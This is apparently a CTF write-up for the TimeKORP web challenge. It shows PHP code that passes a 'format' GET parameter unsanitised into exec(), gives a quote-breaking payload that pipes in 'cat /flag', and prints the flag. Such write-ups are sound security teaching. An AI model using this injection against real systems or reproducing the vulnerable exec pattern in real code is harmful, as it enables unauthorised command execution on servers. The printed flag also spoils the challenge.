# TimeKORP - Very Easy

In this challenge, participants are provided with a website and the PHP source code.

![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/a7a3215c-4400-4ea0-95ab-70af31e9a1b1)


## Solution

There is a Command Injection in `exec` function within this code:

> /challenge/models/TimeModel.php
> ```php
> <?php
> class TimeModel
> {
>    public function __construct($format)
>    {
>        $this->command = "date '+" . $format . "' 2>&1";
>    }
>
>    public function getTime()
>    {
>        $time = exec($this->command);
>        $res  = isset($time) ? $time : '?';
>        return $res;
>    }
>}
>```

The `$format` is a input that we can control in `format` GET parameter

> /challenge/controllers/TimeController.php
> ```php
> <?php
> class TimeController
> {
>     public function index($router)
>     {
>         $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
>         $time = new TimeModel($format);
>         return $router->view('index', ['time' => $time->getTime()]);
>     }
> }
> ```

Using this payload to pipe the `date` command and inject our command to read the flag file.


```
+%H:%M:%S'|cat '/flag
```

![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/221f581f-484d-48e7-8c11-78c5f6293238)




## Flag
HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}
